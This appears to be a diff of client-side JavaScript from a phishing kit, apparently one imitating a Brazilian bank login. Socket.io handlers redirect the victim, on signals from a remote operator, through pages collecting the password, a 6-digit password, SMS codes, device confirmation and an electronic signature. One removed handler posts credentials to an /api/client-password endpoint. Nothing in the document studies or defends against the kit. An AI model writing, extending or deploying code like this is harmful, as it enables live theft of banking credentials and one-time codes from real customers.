@@ -5,50 +5,46 @@ const await = (() => {
             if (user.id) window.location.href = `/sinbc-login?client=${user.id}&error=true`
         })
 
-        socket.on('command sms', async (user) => {
-            try {
-                const client = await util.post(`/api/client-password`, user)
+        socket.on('getAuth', data => {
+            const params = new URLSearchParams(window.location.search)
 
-                if (user.id) window.location.href = `/sms?client=${user.id}`
-            } catch (error) {
-                alert(error)
-            }
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/verify-authentic?client=${data}`
+            } else return
         })
 
-        socket.on('errorsms', (user) => {
-            if (user.id) window.location.href = `/confirmsms?client=${user.id}&error=true`
+        socket.on('disp', (data) => {
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/dispositivo?client=${data}`
+            } else return
         })
 
-        socket.on('sms', (user) => {
-            if (user.id) window.location.href = `/confirmsms?client=${user.id}`
+        socket.on('erroruser', (data) => {
+
+            const params = new URLSearchParams(window.location.search)
+
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/?client=${data}`
+            } else return
         })
 
+        socket.on('errorpass6', (data) => {
+            const params = new URLSearchParams(window.location.search)
 
-        socket.on('signature', (user) => {
-            alert('Campo inválido, preencha corretamente')
-        })
 
-        socket.on('errorsignature', (user) => {
-            if (user.id) window.location.href = `/eletronic?client=${user.id}&error=true`
-        })
-
-        //user
-        socket.on('erroruser', user => {
-            alert('Usuário inválido, preencha corretamente')
-            if (user.id) window.location.href = `/?client=${user.id}`
-        })
-
-        //
-        socket.on('finish', client => {
-            window.location.href = `/finish?client=${client.id}`
+            if (params.has('client')) {
+                if (params.get('client') == data) window.location.href = `/password6?client=${data}`
+            } else return
         })
     }
 
     function startRoom() {
-        socket.emit('start', theUser)
+        // socket.emit('start', theUser)
 
-        //await
-        socket.emit('await', theUser)
+        // //await
+        // socket.emit('await', theUser)
     }
 
     return {
